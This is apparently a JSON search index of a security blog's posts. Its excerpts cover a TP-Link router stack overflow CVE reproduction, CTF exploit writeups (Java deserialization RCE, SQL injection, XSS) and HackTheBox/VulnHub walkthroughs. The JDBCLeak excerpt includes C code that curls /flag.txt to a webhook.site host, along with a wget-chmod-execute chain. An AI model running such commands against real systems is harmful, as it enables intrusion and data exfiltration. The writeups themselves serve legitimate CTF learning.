[{"categories":["Exploitation"],"content":"Recently i was exploring Firmware analysis and iot exploitation domain out of curiosity , and it turned out to be very interesting to me. i spent a while studying Exploitation Basics , Solving Basic PWN \u0026 Reverse Engineering Challanges and Checking IOT Pentesting Course From FahemSec. I Spent days analyzing firmware and binaries in Ghidra and GDB and Finally I was able to reproduce couple of CVEs on TpLink Routers and even discover new ones! In This Post i am analyzing the CVE-2022-0650 which as","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:0:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Setting Up Environment ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Getting Firmware We don’t need to buy this specifc router to analyze/reproduce bugs , Most of TpLink Firmwares are public on their website to download. we can download that version from here. after downloading it we got .bin file which is the firmware file. we can inspect the SquashFS system if we want by running binwalk -e fw.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 15120 0x3B10 LZMA compressed data, properties: 0x5D, d","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:1","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Firmadyne Emulation As we have the firmware binary file we can try emulate it with firmadyne tool From Repo it uses Qemu to emulate that image. After setting it up and configure what needed as repo mentions , we can run the binary , 1 is the image id which will be 1 for your first image firmadyne/scratch/1/run.sh Creating TAP device tap1_0... Set 'tap1_0' persistent and owned by uid 1000 Bringing up TAP device... Adding route to 192.168.0.1... Starting firmware emulation... use Ctrl-a + x to exi","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:2","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Locating Httpd Binary The Firmware Binary file itself contains alot of data like filesystem , binaries ,services and more. we are analyzing those services/binaries , Logging into the webportal (default creds are admin:admin) will find the following URL Format : NTOYIHJBBFEPWVDA is changed each time we login as it is related to session http://192.168.0.1/NTOYIHJBBFEPWVDA/userRpm/Index.htm\rIf we searching in the squashFs files for what binaries might include that URI will find /usr/bin/httpd , tha","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:3","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Analyzing the Binary The Advisory Contains “TP-Link TL-WR940N httpd newBridgessid Stack-based Buffer Overflow Remote Code Execution Vulnerability” We have a place to start from , searching for newBridgessid we will find the following string which has a reference in FUN_0045b218 Inspecting The Function we can understand the root cause of the Bug , although strncpy is more safe than strcpy as it has additional parameter that specifies the length to copy from source to destination. in this code sni","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:2:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Debugging and Overwriting PC The page doesn’t seem to be accessed from the UI , but we can capture a valid request and add parameters as following ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Setting up GDB To be able to use GDB First we need to move gdb-server to the image first , we can do that easily by running scripts/mount.sh 1 and move it there and run scripts/umount.sh 1 to unmount it then run the image again. Get the httpd process (last one in processes) and run the gdb server ./gdbserver-7.12-mips-be-stripped --attach :1234 813 Attached; pid = 813 Listening on port 1234\rNow From Your machine connect to it and make a breakpoint on strncpy sudo gdb-multiarch \\ -ex \"set archite","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:1","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Overwriting PC Now Sending a slightly large payload of “A” into that parameter in GDB we can find the PC has been overwritten successfully Now to get the offset will generate a pattern with cyclic and check its offset pwndbg\u003e cyclic -l 0x72616162 Finding cyclic pattern of 4 bytes: b'raab' (hex: 0x72616162) Found at offset 168\r","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:2","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Stack Analysis Now Sending the payload \"A\"*168+\"BBBB\"+\"C\"*128+\"DDDD\" to confirm we control PC and check where rest of input is placed on stack. we can confirm that we can control PC , also rest of payload is placed on stack and SP is pointing to it ! Checking NX on The binary to check if stack is exectuable , and it is pwndbg\u003e checksec File: /tmp/tmpppjkpr27/tmp3fys92c7 Arch: mips RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable R","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:3","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"POC For a Shell As we are going to use pwntools and make TCP Connection , we need to use construct the HTTP Request OurSelves. Example : def update_wifi_config(token): url = f\"http://192.168.0.1/{token}/userRpm/WlanNetworkRpm.htm\" params = { \"ssid1\": \"TP-LINK_B324_t\", \"ssid2\": \"TP-LINK_B324_2AAAAA\", \"ssid3\": \"TP-LINK_B324_3\",\"ssid4\": \"TP-LINK_B324_4\", \"region\": \"101\", \"band\": \"0\",\"mode\": \"5\" ,\"chanWidth\": \"2\",\"channel\": \"15\",\"ap\": \"1\",\"broadcast\": \"2\",\"brlssid\": \"\",\"brlbssid\": \"\",\"addrType\": \"1\"","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:4:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Code Review"],"content":"JDBCLeak Leak was a challenge introducted in EGCERT CTF Finals 2025 under the category R\u0026D , tbh i didn’t even look at the challenge during CTF Time , didn’t expect this category to introduce such good example of a real case code review challenge , however after reading the author’s blog here about the category and challenge i thought of trying it myself and create a POC for it to get rce reading /flag.txt , we got 3rd place btw :“D ","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:0:0","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["Code Review"],"content":"Basic Code analysis as already explained by the author we start with the web.xml file as it contains the routes and mappes servlets (which is the codebase mapped to the route) which contains the following /vjdbc endpoint has servlet VJdbcServlet VJdbcServlet servlet is mapped to class de.simplicit.vjdbc.server.servlet.ServletCommandSink which should be our start point. \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"h","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:1:0","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["Code Review"],"content":"Exploiting Virtual JDBC I have made a simple script to send the raw payload and will use it in sending any payload import requests import sys def send_bin_payload(url, bin_file_path): headers = { 'Content-Type': 'binary/x-java-serialized', 'vjdbc-method': 'process' } try: with open(bin_file_path, 'rb') as f: payload = f.read() response = requests.post(url, headers=headers, data=payload) print(f\"Status Code: {response.status_code}\") print(f\"Response Headers: {response.headers}\") try: print(f\"Resp","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:2:0","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["Code Review"],"content":"Generate a payload #include \u003cstdlib.h\u003e int main() { system(\"curl -X POST -F 'file=@/flag.txt' https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7\"); return 0; } // compile with gcc test.c -o test\rNow will generate 3 java serilaized objects and run the python script for each to get the final flag wget http://server/test chmod +x ./test ./test\r","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:2:1","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["OSINT"],"content":"CyCTF is organized by Cyshield’s cysec team every year , demonstrating new ideas and techniques in different categories (web exploitation , cryptography ,reverse and malware analysis , pwn , osint , mobile). it was my pleasure to be the author of SMS and vengeance challenges in web exploitation category and for the osint category in qualifcation and finals. this blog post will be about the solutions for the osint category in the finals round. My approach for creating the challenges was to not ma","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:0:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["OSINT"],"content":"New Friend challenge New Friend about osint process , video analysis , GEOINT , SOCMINT description we have been tracking a female suspect recently and we were able to hack into her mobile phone , however she seems to be very cautious and most likely she already know her phone is not safe anymore , while trying to locate her place it was located in Egypt however we are sure 100% this is not true. we were able to record a short video from her phone before she powered it off eventually and we were","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:1:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["OSINT"],"content":"Maybe in another UniVerse challenge Maybe in another UniVerse about osint process , GEOINT , Metaverse description The Authorities have been tracking a hacker goes with the name “PWner” , he has been travelling from a country to another to erase his steps , he was very cautions recently , he has deleted most of his social media accounts like facebook , instagram and others based on our observations ,so any user with same name you might found most probably a fake one. But recently we were able to","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:2:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["OSINT"],"content":"Complicated challenge Complicated about osint process , advanced GEOINT , SOCMINT description Hello Old Friend , One of my friends challenged me to solve a case but you have never disappointed me and i don’t think you will this time , all we know is that during tracking our target , he have recently attended a football match in France and after that he walked to KFC to have a nice meal, the catch is he made a mistake sharing something that reveals his identity while doing these activities. you m","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:3:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["Code Review"],"content":"Wizer CTF is an exciting game designed specifically for developers . It’s all about putting your skills to the test and seeing if you can identify and exploit vulnerabilities while honing your secure coding abilities. The game kicks off with a snappy code snippet that comes with some tricky vulnerabilities. Your goal? Spot those vulnerabilities and figure out how to exploit them. The cool thing is that you don’t have to rely on guesswork to know if you’ve got it right. You can actually execute y","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:0:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"1- Login as an Admin (SQLi) The first challenge is a typicall sql injection challenge however it checks if the password we enter is the same returning from the table which makes it a bit tricky , also the name of admin was given “fitzh” const getUser = async (userName, password) =\u003e { let connection = mysql.createConnection(process.env.DATABASE_URL); const query = `SELECT userName, password, type, firstName, lastName FROM users_table WHERE userName = '${userName}' and password = '${password}'`; c","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:1:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"2- Augustus Gloop’s Secret (APIs) The challenge discusses a recent bypass technique that when an api is blacklisted like “/admin” , it can be called with “/admin/” and the check will be bypassed easily , but this time they blacklisted the / character , so we can find other way to add a character make it valid to request /getuser but also bypasses the check of requireAuthentication There is a user id :4dc6b6fa-963f-4c51-b100-d2c5def2498d given to retrieve its data as a POC. dotenv.config(); const","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:2:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"3- Hack the Menu (XSS) The challenge is a clear open redirect challenge to trigger XSS via the javascript scheme , however the scheme is blocked in all cases as shown import React from 'react'; import Image from 'next/image' const sanitizeLink = (directLink) =\u003e { // prevent XSS (replace case insensitive 'javascript' recursively in the URL) let searchMask = \"javascript\"; let regEx = new RegExp(searchMask, \"ig\"); while(directLink !== String(directLink).replace(regEx, '')) { directLink = String(dir","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:3:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"4- Sensitive Flags (Nodejs UIDv1) The goal of the challenge is clear we want to issue a request to /flag with a valid username and a valid corresponding API_KEY , although it checks for authroization header we can still see the data at the redirect response (unsafe redirect) , and we can generate API_KEY for the admin account using createAPIKey const secretKey = crypto.randomBytes(64); const flags = { 'Belgium': 'black yellow red', 'United States': 'red white blue', 'France': 'blue white red', '","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:4:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"6- Sign Here (React Native) This challenge was the most interesting one as it contains APK analysis part , analyzing the code we will understand the following to get the flag /flag we need to be logged in (have a valid session) we also need a valid signature which contains url , body parameters so we don’t manipulate it we can’t get admin password or secret key directly there is an apk we can use as a client to send requests const users = { 'admin': { id: 1, username: 'admin', password: process.","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:5:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Web Exploitation"],"content":"This Challenge is about exploiting cross site scripting with a strict CSP in place along with XSS Santizer and other restrictions , the interesting part in this blog is about learning the root cause and idenfiy exploit points. the challenge may seem very easy and it is easy and fun indeed. ","date":"2023-06-04","objectID":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/:0:0","tags":["CTF","XSS","CSP"],"title":"JustCTF Extra Safe Security Layers writeup","uri":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/"},{"categories":["Web Exploitation"],"content":"Source Code Review we are give the following files along with the Dockerfile â”‚ app.js\râ”‚ bot.js\râ”‚ flag.txt\râ”‚ package.json\râ”‚ tempCodeRunnerFile.js\râ”‚\râ”œâ”€â”€â”€public\râ”‚ admin_background.png\râ”‚ background.png\râ”‚\râ””â”€â”€â”€templates\rindex.ejs\rapp.js First we have some imports and rate limiter because the challenge has one public URL For all players. also admin cookie is a random UUID value.( UUID Example : d29217e9-d6b2-435e-99ef-84fb52c267cb) import express from \"express\"; import","date":"2023-06-04","objectID":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/:1:0","tags":["CTF","XSS","CSP"],"title":"JustCTF Extra Safe Security Layers writeup","uri":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/"},{"categories":["Web Exploitation"],"content":"Goal We are against typical xss challenge where a bot visits an application vulnerable to cross site scripting and when the bot opens the page along with parameters we supply , it will be triggered and we should get the flag cookie value. However we have some obstacles here : 1- The strict CSP we got assigned because we don’t have one in our user object 2- The XSS Sanitizer does not have bypasses we can use Bypassing CSP We can get around the first obstacle thanks to the vuln in the Safety layer","date":"2023-06-04","objectID":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/:2:0","tags":["CTF","XSS","CSP"],"title":"JustCTF Extra Safe Security Layers writeup","uri":"/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/"},{"categories":["Linux Machines"],"content":"In This Box we are facing interesting Stuff like Docker , git hooks and other stuff. first we got access to a docker in the machine by overwritting the application code with a reverse shell. then we make port forwarding to scan the original host which has a Service running and we can see it from the docker. From this Service we can get access to the actual machine and from their we can get the root access using git hooks because the root seems to have a cronjob running git Scanning nmap -A -T5 1","date":"2022-10-08","objectID":"/posts/linux-machines/2022-10-08-open-source/:0:0","tags":["Hackthebox","git","docker","port-forwarding"],"title":"Open Source HackTheBox Writeup","uri":"/posts/linux-machines/2022-10-08-open-source/"},{"categories":["Web Exploitation"],"content":"This challenge was in Blackhat CTF Qualifications 2022 and we have participated under the team 0xCha0s, we have managed to solve multiple challenges. this challenge was ranked medium for 250 pts . Enumeration We are introduced with this page , it takes the search engine (google,duckduckgo,search encrypt) and the Query we want testing the application functions we can try google engine with any word , and we can see the image rendered as follows The request is issued to /api/generate with the sear","date":"2022-10-01","objectID":"/posts/web-exploitation/2022-10-01-meme-generator/:0:0","tags":["CTF","SSRF"],"title":"meme generator challenge writeup","uri":"/posts/web-exploitation/2022-10-01-meme-generator/"},{"categories":["Windows Machines"],"content":"In this Box we are against a windows machine has the active directory service installed on it , we can list files on smb shares and access some shared folder to find a backup.zip file which contains a pfx file for a user on the domain , we can also find some hints about LAPS. after extracting the key and certificate from the pfx file we can login using WinRM. then checking the powershell history we can see password for another user which is a memeber of the LAPS_READERS Group so the other user c","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:0:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Scanning nmap -Pn -A -T4 10.10.11.152 -oN nmap.intial\rOutput PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-20 21:08:49Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Micr","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:1:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Enumeration We can start Enumerating the smb service to check if we have access without providing passwords : smbclient -L 10.10.11.152 Enter WORKGROUP\\kali's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available\rwe can list the folders without any password , we can go check non defaults folders like Shares smbcli","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:2:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Foothold We can Authenticate to the box using the key and the cert we have generated from the pfx file . as the we have said before we can use evil-winrm to login so let’s try : evil-winrm -u legacy -c leg.crt -k leg.key -i 10.10.11.152 -S\rwe can upload Winpeas to see if there is any low hanging fruits first : *Evil-WinRM* PS C:\\Users\\legacyy\\Favorites\u003e upload winPEAS.bat\rand we can find under the PowerShell history C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\Console","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:3:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"Privilege escalation After logging in successfully with that user, we can think of the LAPs we have found earlier maybe it was there for a reason. Reading here we can check if it is installed using : Get-ChildItem 'C:\\Program Files\\LAPS\\CSE\\Admpwd.dll'\rand it is indeed installed , reading about LAPS Attributes we can see this , maybe the ms-Mcs-AdmPwd is misconfigured The Misconfiguration : Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Sel","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:4:0","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Windows Machines"],"content":"pwned","date":"2022-08-20","objectID":"/posts/windows-machines/2022-08-20-timelapse/:4:1","tags":["Hackthebox","Active-directory","LAPS","pfx"],"title":"Timelapse Hackthebox writeup","uri":"/posts/windows-machines/2022-08-20-timelapse/"},{"categories":["Web Exploitation"],"content":" CTF name AWG 2022 challenge kenzy category web about SQL injection description captcha is not that secure points 900 team 0xCha0s ","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:0:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Discovery we are introduced with this page which takes username ,password and the Captcha If we check the source code we can notice this comment \u003c!-- Username =====\u003e admin --\u003e\rwe can also find the endpoint which generates the captcha each time we request it different captcha is assigned http://34.175.249.72:60001/scripts/captcha.php\rLet’s check the application by submitting the admin as a username and any password with a valid captcha It returns an invalid username or password because we don’t r","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:1:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Exploitation First we need to parse the captcha somehow , we can try issue a request to /scripts/captcha.php to see if the response contains the captcha as text. and indeed it sends the captcha base64 encoded , so we can parse it easily and get the value . import requests import base64 s = requests.Session() url = \"http://34.175.249.72:60001/scripts/captcha.php\" r = s.get(url) captcha = str(r.content).split(':')[-1].replace('\"','').replace(\"'\",'') captcha_decode = base64.b64decode(base64.b64deco","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:2:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Getting the Flag will use same approach to get the flag content , we can guess the column is named flag and we can verify that by using this payload payload = \"admin' AND 'f'=substr((select column_name from information_schema.columns WHERE table_name='solve' limit 1),1,1)#\".replace(' ','/**/').replace('AND','ANANDD')\rand will find f is valid as the first character in the column_name , we can continue until we find column name is flag indeed now we can start ask for each character in our flag unt","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:3:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Lexington Informatics Tournament CTF CTF 2022 was held from the 22nd of July Until the 25th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was solved less than 50 times in the 3 days and it was really nice. CTF name LITCTF 2022 challenge Flushed Emoji category web about SSTI , SQL injection description Flushed emojis are so cool!! points 250 team 0xCha0s Discovery we are given source code , so we can start from there ","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:0:0","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Web Exploitation"],"content":"main-server we can start checking the main-server/main.py file , let’s check the important parts : there is a login function which make sure the password doesn’t contain a dot def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if('.' in password): return render_template_string(\"lmao no way you have . in your password LOL\");\rif we have passed the dot check , our data will be sent as a post request to a remote server we don’t know its ","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:0:1","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Web Exploitation"],"content":"data-server now Let’s check the data-server/main.py code here we can see the flag is inserted into the database at the data server and if we check the rest of the code we can’t find any condition lead to make the flag be printed so keep sql injeciton in our mind con = sqlite3.connect('data.db', check_same_thread=False) app = Flask(__name__) flag = open(\"flag.txt\").read(); cur = con.cursor() cur.execute('''DROP TABLE IF EXISTS users''') cur.execute('''CREATE TABLE users (username text, password t","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:0:2","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Web Exploitation"],"content":"Exploitation Let’s just confirm the server returns True or False : \u003e\u003e\u003e import requests \u003e\u003e\u003e url = \"http://172.24.0.8:8080/runquery\" \u003e\u003e\u003e data={'username':'test','password':'test'} \u003e\u003e\u003e r = requests.post(url,json=data) \u003e\u003e\u003e print(r.text) False\rwe will exploit this SQL statement SELECT * FROM users WHERE username='\u003cusername\u003e' AND password='\u003cpassword\u003e'\rwe can try basic payload to alter the SQL execution : junk' OR 1=1--\rand it returns True indeed : in This CTF challenge we know the flag format so it is","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:1:0","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Android Pentesting"],"content":"In this Box we are going to examine an android appliacation (apk) , and monitroing the requests by placing a proxy we will notice a request which we can manipulate to get a remote code exection. this box has a lot of iptables rules which restrict us from getting a reverse shell in the usual way. so we will login via ssh by placing our public key at paul’s. from that we will gain root access by exploiting sudo itself. Scanning nmap -A -T4 $IP -oN nmap.intial\rUseful output PORT STATE SERVICE VERSI","date":"2022-07-09","objectID":"/posts/android-pentesting/2022-07-09-routerspace/:0:0","tags":["Hackthebox","apk","adb","sudo-exploit"],"title":"Routerspace Hackthebox writeup","uri":"/posts/android-pentesting/2022-07-09-routerspace/"},{"categories":["Android Pentesting"],"content":"pwned","date":"2022-07-09","objectID":"/posts/android-pentesting/2022-07-09-routerspace/:1:0","tags":["Hackthebox","apk","adb","sudo-exploit"],"title":"Routerspace Hackthebox writeup","uri":"/posts/android-pentesting/2022-07-09-routerspace/"},{"categories":["Linux Machines"],"content":"In This VulnHub Box, we are facing a relatively an interesting vulnerability which is tab-nabbing that will help us phish the admin to get his credentials which we can use to ssh into the Box , From There we can get a reverse shell from adrian user as he is running a cron job which is a python script and we can write into it because we are in the administrators group. and for the root part we have sudo privilege on vim editor. you can download the machine from here we have the description : Even","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:0:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Scanning nmap -A -T4 192.168.1.12 -oN nmap.inital\rresults : Host is up (0.0062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA) | 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA) |_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: |","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:1:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Enumeration Before hopping into the website let’s do some basics enumeration from the terminal Directory Busting : ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://192.168.1.12/FUZZ -o files-medium.txt -fc 403\rOutput : config.php [Status: 200, Size: 0, Words: 1, Lines: 1] index.php [Status: 200, Size: 1219, Words: 